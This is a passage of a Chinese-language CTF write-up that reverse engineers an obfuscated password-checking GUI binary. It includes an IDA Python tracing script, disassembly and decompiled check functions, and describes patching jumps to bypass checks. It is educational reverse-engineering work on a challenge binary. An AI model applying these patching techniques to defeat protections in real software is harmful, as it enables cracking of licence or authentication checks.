class="subst">&#123;size:X&#125;</span>)&quot;</span>)</span><br><span class="line">    force_code_in_range(start, end)</span><br><span class="line">    make_function_in_range(start, size)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ALL Done&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后动态调试（需设置环境变量QT_QPA_PLATFORM_PLUGIN_PATH&#x3D;所在路径），在start下断点，启动instruction tracing，然后运行脚本，trace所有的间接跳转：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_dbg</span><br><span class="line"><span class="keyword">import</span> ida_nalt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">STATIC_BASE = <span class="number">0x140000000</span></span><br><span class="line">addrs = [<span class="number">0x140073000</span>, <span class="number">0x140074860</span>, <span class="number">0x140081760</span>, <span class="number">0x14007D290</span>, <span class="number">0x14000D1E0</span>,</span><br><span class="line">         <span class="number">0x14002F8C0</span>, <span class="number">0x140012E50</span>, <span class="number">0x140001DE0</span>, <span class="number">0x1400202B0</span>, <span class="number">0x14005EF60</span>, <span class="number">0x140037160</span>]</span><br><span class="line">sizes = [<span class="number">0xB20</span>, <span class="number">0x19A7</span>, <span class="number">0x23B0</span>, <span class="number">0x2439</span>, <span class="number">0x3D4A</span>,</span><br><span class="line">         <span class="number">0x645A</span>, <span class="number">0x73BE</span>, <span class="number">0xB08C</span>, <span class="number">0xDC63</span>, <span class="number">0x132ED</span>, <span class="number">0x24D6F</span>]</span><br><span class="line"></span><br><span class="line">OUTPUT_FILE = <span class="string">r&quot;E:/CTF/temp/out.txt&quot;</span></span><br><span class="line"></span><br><span class="line">execution_log = []</span><br><span class="line">func_stats = []</span><br><span class="line">last_trace_time = <span class="literal">None</span></span><br><span class="line">last_timeout_mark = <span class="literal">None</span></span><br><span class="line">TIMEOUT_SECONDS = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHooks</span>(ida_dbg.DBG_Hooks):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_addrs</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.target_addrs = <span class="built_in">set</span>(target_addrs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_trace</span>(<span class="params">self, tid, ip</span>):</span><br><span class="line">        <span class="keyword">global</span> last_trace_time, last_timeout_mark</span><br><span class="line">        now = time.time()</span><br><span class="line">        <span class="keyword">if</span> (last_timeout_mark <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> now - last_timeout_mark &gt;= TIMEOUT_SECONDS) <span class="keyword">and</span> \</span><br><span class="line">           (last_trace_time <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> now - last_trace_time &gt;= TIMEOUT_SECONDS):</span><br><span class="line">            execution_log.append((<span class="string">&quot;TIMEOUT&quot;</span>, <span class="literal">None</span>))</span><br><span class="line">            last_timeout_mark = now</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 5s idle — inserted timeout marker&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> ip <span class="keyword">in</span> <span class="variable language_">self</span>.target_addrs:</span><br><span class="line">            rax = ida_dbg.get_reg_val(<span class="string">&quot;RAX&quot;</span>)</span><br><span class="line">            execution_log.append((ip, rax))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[TRACE] 0x<span class="subst">&#123;ip:X&#125;</span> -&gt; RAX=0x<span class="subst">&#123;rax:X&#125;</span>&quot;</span>)</span><br><span class="line">            last_trace_time = now</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_process_exit</span>(<span class="params">self, pid, tid, ea, exit_code</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Process exited (code=<span class="subst">&#123;exit_code&#125;</span>)&quot;</span>)</span><br><span class="line">        finish_logging()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_jmp_call_rax_runtime</span>(<span class="params">start_ea, end_ea</span>):</span><br><span class="line">    results = []</span><br><span class="line">    ea = start_ea</span><br><span class="line">    <span class="keyword">while</span> ea &lt; end_ea:</span><br><span class="line">        b0 = ida_bytes.get_byte(ea)</span><br><span class="line">        b1 = ida_bytes.get_byte(ea + <span class="number">1</span>) <span class="keyword">if</span> ea + <span class="number">1</span> &lt; end_ea <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> b0 == <span class="number">0xFF</span> <span class="keyword">and</span> b1 == <span class="number">0xE0</span>:</span><br><span class="line">            results.append((ea, <span class="string">&quot;jmp&quot;</span>))</span><br><span class="line">            ea += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> b0 == <span class="number">0xFF</span> <span class="keyword">and</span> b1 == <span class="number">0xD0</span>:</span><br><span class="line">            results.append((ea, <span class="string">&quot;call&quot;</span>))</span><br><span class="line">            ea += <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>: ea += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">finish_logging</span>():</span><br><span class="line">    hooks = <span class="built_in">getattr</span>(main, <span class="string">&#x27;hooks&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> hooks: hooks.unhook()</span><br><span class="line">    actual_base = ida_nalt.get_imagebase()</span><br><span class="line">    os.makedirs(os.path.dirname(OUTPUT_FILE), exist_ok=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(OUTPUT_FILE, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">f&quot;Runtime base: 0x<span class="subst">&#123;actual_base:X&#125;</span>\n\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;=== Part 1: Counts (static scan) ===\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i, (jmp, call) <span class="keyword">in</span> <span class="built_in">enumerate</span>(func_stats):</span><br><span class="line">            f.write(<span class="string">f&quot;Func <span class="subst">&#123;i&#125;</span>: jmp=<span class="subst">&#123;jmp&#125;</span>, call=<span class="subst">&#123;call&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;\n=== Part 2: Execution Log (in order, runtime addresses) ===\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> execution_log:</span><br><span class="line">            <span class="keyword">if</span> item[<span class="number">0</span>] == <span class="string">&quot;TIMEOUT&quot;</span>:</span><br><span class="line">                f.write(<span class="string">&quot;=== Run To A Manual Part ===\n&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ip, rax = item</span><br><span class="line">                f.write(<span class="string">f&quot;0x<span class="subst">&#123;ip:X&#125;</span> -&gt; RAX=0x<span class="subst">&#123;rax:X&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Saved to <span class="subst">&#123;OUTPUT_FILE&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> func_stats, last_trace_time</span><br><span class="line">    actual_base = ida_nalt.get_imagebase()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Runtime base: 0x<span class="subst">&#123;actual_base:X&#125;</span>&quot;</span>)</span><br><span class="line">    all_jc = []</span><br><span class="line">    func_stats = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(addrs)):</span><br><span class="line">        static_start = addrs[i]</span><br><span class="line">        size = sizes[i]</span><br><span class="line">        offset = static_start - STATIC_BASE</span><br><span class="line">        runtime_start = actual_base + offset</span><br><span class="line">        runtime_end = runtime_start + size</span><br><span class="line">        jc_list = scan_jmp_call_rax_runtime(runtime_start, runtime_end)</span><br><span class="line">        all_jc.extend(jc_list)</span><br><span class="line">        jmp_count = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> _, t <span class="keyword">in</span> jc_list <span class="keyword">if</span> t == <span class="string">&quot;jmp&quot;</span>)</span><br><span class="line">        call_count = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> _, t <span class="keyword">in</span> jc_list <span class="keyword">if</span> t == <span class="string">&quot;call&quot;</span>)</span><br><span class="line">        func_stats.append((jmp_count, call_count))</span><br><span class="line">    runtime_addrs = [ea <span class="keyword">for</span> ea, _ <span class="keyword">in</span> all_jc]</span><br><span class="line">    hooks = MyHooks(runtime_addrs)</span><br><span class="line">    hooks.hook()</span><br><span class="line">    last_trace_time = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Hook installed.&quot;</span>)</span><br><span class="line">    main.hooks = hooks</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><small><em>此脚本记录了程序的整个流程中所有的间接跳转行为：<font color=orange><strong>加载GUI界面</strong></font> → <font color=yellow><strong>第一次按下按钮</strong></font> → <font color=orange><strong>加载输入逻辑</strong></font> → <font color=yellow><strong>按下OK触发检验</strong></font> → <font color=orange><strong>检验逻辑</strong></font> → <font color=yellow><strong>关闭窗口</strong></font> → <font color=orange><strong>清零输入框</strong></font> → <font color=yellow><strong>关闭程序</strong></font> → <font color=orange><strong>程序退出</strong></font>，其中橙色的是程序自己的逻辑，其中黄色的是用户的交互部分，这些交互部分持续时间长，过程中不会发生任何trace行为，所以以时间间隔作为切分标准，在输出中插入用户完成的部分，以此区分每个过程所用到的函数地址段.</em></small></p>
<p>分析得到的trace，发现有以下逻辑：</p>
<p><img src="/pictures/flareon_12_8_trace.png" title="visualize"></p>
<table>
<thead>
<tr>
<th>事件类型</th>
<th>地址范围</th>
<th>出现次数</th>
<th>对应函数</th>
</tr>
</thead>
<tbody><tr>
<td>启动程序</td>
<td>0x140002D7B ~ 0x14007ED7E</td>
<td>972</td>
<td>main → sub_140037160 → sub_140001DE0 → sub_14000D1E0 → main</td>
</tr>
<tr>
<td>加载输入</td>
<td>0x140013280 ~ 0x1400831D8</td>
<td>2</td>
<td>sub_140012E50 &amp; sub_140081760</td>
</tr>
<tr>
<td>触发校验</td>
<td>0x140021593 ~ 0x14002A500</td>
<td>16</td>
<td>sub_1400202B0</td>
</tr>
<tr>
<td>清空输入</td>
<td>0x14000D57E ~ 0x14002B29C</td>
<td>26</td>
<td>sub_140012E50</td>
</tr>
<tr>
<td>退出程序</td>
<td>0x1400730F3 ~ 0x140075C85</td>
<td>1</td>
<td>main</td>
</tr>
</tbody></table>
<p>因此，sub_1400202B0就是最关键的校验函数之一：</p>
<p><img src="/pictures/flareon_12_8_trace_seg2.png" title="visualize"></p>
<p>发现校验函数是大量线性化的，其中有很大一部分代码被跳过了，可能是未通过某种校验，重复的部分大概有15轮多一些的循环和8轮多一些的循环，接下来先查看到地址发生跳变的位置：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000140022113</span>                 <span class="keyword">jmp</span>     <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140022115</span>                 <span class="keyword">mov</span>     <span class="built_in">al</span>, [<span class="built_in">rbp</span>+<span class="number">2950h</span>+var_21C1]</span><br><span class="line"><span class="symbol">.text:</span>000000014002211B                 <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000014002211D</span>                 <span class="keyword">jnz</span>     short loc_140022124</span><br><span class="line"><span class="symbol">.text:</span>000000014002211F                 <span class="keyword">jmp</span>     loc_14002795C</span><br></pre></td></tr></table></figure>

<p>这里22113直接跳转到了下一行（22115），从<font color=lime><strong>[rbp+2950h+var_21C1]</strong></font>提取了某种校验结果，接下来jnz跳转到22124，否则直接跳到2795C，看起来这就是发生跳变的根本原因：此处的某种校验未通过，接下来动态调试，测试明文<font color=red><strong>1234567890123456789012345</strong></font>，在函数开头断点，搜索内存，找到明文存储的位置：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">debug308:</span>000002598BC39660 a12345678901234 <span class="built_in">db</span> <span class="string">&#x27;1234567890123456789012345&#x27;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>发现同一次启动过程中明文输入是被写入栈上的同一个位置的，在该位置下硬件断点，写入一个字符后发现在<font color=violet><strong>0x140015A47</strong></font>的call rax触发了检测：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">read_for_input_w</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">void</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read_for_input</span>(a1, a2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">read_for_input</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">void</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v2 = <span class="built_in">strlen_w</span>(a2);</span><br><span class="line">  Size = <span class="built_in">self</span>(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">input_pwd_nums</span>(a1, a2, Size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 *__fastcall <span class="title">input_pwd_nums</span><span class="params">(__int64 *dest, <span class="type">void</span> *inp, <span class="type">size_t</span> Size_1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v12 = &amp;v11;</span><br><span class="line">  v11 = &amp;v12;</span><br><span class="line">  Sizea = Size_1;</span><br><span class="line">  inp_ = inp;</span><br><span class="line">  dest_1 = dest;</span><br><span class="line">  v6 = dest[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> ( Size_1 &gt; dest[<span class="number">3</span>] - v6 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">expand_buffer</span>(dest, Sizea, v5[<span class="number">0</span>], (__int64)inp_, Sizea);</span><br><span class="line">  dest[<span class="number">2</span>] = Sizea + v6;</span><br><span class="line">  *(_QWORD *)&amp;v5[<span class="number">2</span>] = <span class="built_in">get_data</span>(dest);</span><br><span class="line">  <span class="built_in">input_pwd_single_num</span>((<span class="type">void</span> *)(v6 + *(_QWORD *)&amp;v5[<span class="number">2</span>]), inp_, Sizea);</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">add_str_end</span>((_BYTE *)(Sizea + v6 + *(_QWORD *)&amp;v5[<span class="number">2</span>]), &amp;v5[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> *__fastcall <span class="title">input_pwd_single_num</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *input, <span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v6 = &amp;v5;</span><br><span class="line">  v5 = &amp;v6;</span><br><span class="line">  <span class="built_in">memmove</span>(dest, input, Size);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就是负责把输入写到栈上的几个函数，同理可以定位到call清空输入函数的位置<font color=violet><strong>0x14000FAC1</strong></font>，但是尝试在明文上下断点，发现从按下检验按钮到弹出密码错误的全程根本没有被断到.</p>
<p>来到22113的位置，jnz改jz，发现下面有：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00007FF7E57F22DE <span class="keyword">movaps</span>  <span class="built_in">xmm0</span>, xmmword <span class="built_in">ptr</span> [<span class="built_in">rcx</span>+<span class="built_in">rdx</span>]</span><br><span class="line"><span class="symbol">.text:</span>00007FF7E57F22E2 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">10h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF7E57F22E6 <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="number">5497F002705654CFh</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF7E57F22F0 <span class="keyword">movaps</span>  <span class="built_in">xmm0</span>, xmmword <span class="built_in">ptr</span> [<span class="built_in">rcx</span>+<span class="built_in">rdx</span>]</span><br><span class="line"><span class="symbol">.text:</span>00007FF7E57F22F4 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rax</span>], <span class="built_in">xmm0</span></span><br></pre></td></tr></table></figure>

<p>此处恰好用xmm寄存器加载了之前的36字节数组的前32项，存入了栈上，也打上硬件断点</p>
<p>之后动态调试发现明文的部分被调用，在<font color=violet><strong>0x140060BF1</strong></font>（属于sub_14005EF60，这个函数在之前的trace记录中未出现）处的call rax中调用了strlen并求了明文的长度，猜测之前的test比较实际上是反调试，结果运行发现程序居然直接弹出了success，虽然结果是乱码，但这似乎说明检验逻辑还是前面的结果，后面的function应该是32字节密文的解密函数，这说明，实际上输入值的校验逻辑很少（只有从按下按钮到jnz那个位置的一点点），尝试将sub_1400202B0的所有jmp rax全nop掉，发现并不影响后续的解密，因此全部nop后反编译函数，查看前半段：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">sub_1400202B0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  v1 = ((jmptable[<span class="number">14940</span>] + <span class="number">0x5E44FBCB4F243E53LL</span>))(v1062);</span><br><span class="line">  v2 = ((jmptable[<span class="number">10247</span>] - <span class="number">0x28BFB5DCDC279D57LL</span>))(*v1);</span><br><span class="line">  ((jmptable[<span class="number">19728</span>] + <span class="number">0x1721AB0F45842383LL</span>))(*v2) = <span class="number">7499</span>;</span><br><span class="line">  v3 = ((jmptable[<span class="number">4536</span>] + <span class="number">0x54BD4163F2F0F7D9LL</span>))(v984);</span><br><span class="line">  v4 = ((jmptable[<span class="number">19738</span>] - <span class="number">0x7DFD7B17745710ABLL</span>))(*v3);</span><br><span class="line">  ((jmptable[<span class="number">15289</span>] + <span class="number">0x47DDB7E8B57507C1LL</span>))((*v4) + <span class="number">16LL</span>) = <span class="number">7499</span>;</span><br><span class="line">  v5 = ((jmptable[<span class="number">6718</span>] + <span class="number">0x3C26E6D0F570B54CLL</span>))(v954);</span><br><span class="line">  v6 = ((jmptable[<span class="number">17102</span>] - <span class="number">0x6FEBE53F68431F97LL</span>))(*v5);</span><br><span class="line">  v7 = ((jmptable[<span class="number">12227</span>] + <span class="number">0x6CD614C4B188819LL</span>))(*v6);</span><br><span class="line">  v945 = <span class="number">758585089LL</span> * ((jmptable[<span class="number">4914</span>] - <span class="number">0x65C3C1DE9FABF6C4LL</span>))(*v7) + <span class="number">16LL</span>);</span><br><span class="line">  v947 = <span class="number">4185932529LL</span>;</span><br><span class="line">  v946 = ((<span class="number">2</span> * (v945 % <span class="number">0xF98042F1</span> - ((v945 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF09A45D6EuLL</span>)) - <span class="number">0x1ECB74524LL</span>) | (((v945 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF09A45D6EuLL</span>) - ((v945 % <span class="number">0xF98042F1</span>) &amp; <span class="number">0x9A45D6E</span>))) + ((<span class="number">2</span> * (v945 % <span class="number">0xF98042F1</span> - ((v945 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF09A45D6EuLL</span>)) - <span class="number">0x1ECB74524LL</span>) &amp; (((v945 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF09A45D6EuLL</span>) - ((v945 % <span class="number">0xF98042F1</span>) &amp; <span class="number">0x9A45D6E</span>)));</span><br><span class="line">  v948 = v946 % <span class="number">0xF98042F1</span>;</span><br><span class="line">  v8 = ((jmptable[<span class="number">15535</span>] + <span class="number">0x2AE89C655B35F75BLL</span>))(v969);</span><br><span class="line">  ((jmptable[<span class="number">19543</span>] + <span class="number">0x5F08A30C9C4FC1B7LL</span>))((*v8) + <span class="number">16LL</span>) = v946 % <span class="number">0xF98042F1</span>;</span><br><span class="line">  v9 = ((jmptable[<span class="number">16704</span>] + <span class="number">0x265E77A3981E8F61LL</span>))(v984);</span><br><span class="line">  v10 = ((jmptable[<span class="number">16883</span>] + <span class="number">0x19EDD615D994E6BELL</span>))(*v9);</span><br><span class="line">  v871 =((jmptable[<span class="number">16290</span>] - <span class="number">0x219A8B3006EE333ALL</span>))((*v10) + <span class="number">16LL</span>);</span><br><span class="line">  v11 = ((jmptable[<span class="number">11402</span>] + <span class="number">0x21A1833C9081862ALL</span>))(v967);</span><br><span class="line">  v12 = ((jmptable[<span class="number">18239</span>] - <span class="number">0x38FECD2087696090LL</span>))(*v11);</span><br><span class="line">  v13 = ((jmptable[<span class="number">8781</span>] - <span class="number">0x1A7B67F12AE10F0FLL</span>))(*v12);</span><br><span class="line">  ((jmptable[<span class="number">2953</span>] + <span class="number">0x2152BD9F7F962926LL</span>))(*v13);</span><br><span class="line">  n48 = <span class="number">48</span>;</span><br><span class="line">  v14 = <span class="built_in">alloca</span>(<span class="number">48</span>);</span><br><span class="line">  v864 = v659;</span><br><span class="line">  v15 = <span class="built_in">alloca</span>(<span class="number">48</span>);</span><br><span class="line">  v865 = v659;</span><br><span class="line">  v866 = <span class="number">2785373956LL</span> * ((jmptable[<span class="number">19680</span>] + <span class="number">0x722A61684B591457LL</span>))((v1021) + <span class="number">16LL</span>);</span><br><span class="line">  v868 = <span class="number">4185932529LL</span>;</span><br><span class="line">  v867 = ((<span class="number">2</span> * (v866 % <span class="number">0xF98042F1</span> - ((v866 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF176DB5CCuLL</span>)) - <span class="number">0x1D1249468LL</span>) | (((v866 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF176DB5CCuLL</span>) - ((v866 % <span class="number">0xF98042F1</span>) &amp; <span class="number">0x176DB5CC</span>))) + ((<span class="number">2</span> * (v866 % <span class="number">0xF98042F1</span> - ((v866 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF176DB5CCuLL</span>)) - <span class="number">0x1D1249468LL</span>) &amp; (((v866 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF176DB5CCuLL</span>) - ((v866 % <span class="number">0xF98042F1</span>) &amp; <span class="number">0x176DB5CC</span>)));</span><br><span class="line">  v869 = v867 % <span class="number">0xF98042F1</span>;</span><br><span class="line">  v16 = ((jmptable[<span class="number">2445</span>] - <span class="number">0x629324896A4A015BLL</span>))(v984);</span><br><span class="line">  v17 = ((jmptable[<span class="number">12409</span>] + <span class="number">0x4938D72D4DC4A24LL</span>))(*v16);</span><br><span class="line">  v18 = ((jmptable[<span class="number">16925</span>] - <span class="number">0x4F4DA3387B568DLL</span>))(*v17);</span><br><span class="line">  *(*v18 + <span class="number">16LL</span>) = v869;</span><br><span class="line">  v19 = ((jmptable[<span class="number">4495</span>] - <span class="number">0x33B035FF570E4A43LL</span>))(v969);</span><br><span class="line">  v870 =((jmptable[<span class="number">8273</span>] + <span class="number">0x13DA12590CFFE6D0LL</span>))((*v19) + <span class="number">16LL</span>);</span><br><span class="line">  v20 = ((jmptable[<span class="number">4155</span>] - <span class="number">0xBCA0AB10DB2CC04LL</span>))(v1009);</span><br><span class="line">  v21 = ((jmptable[<span class="number">9050</span>] - <span 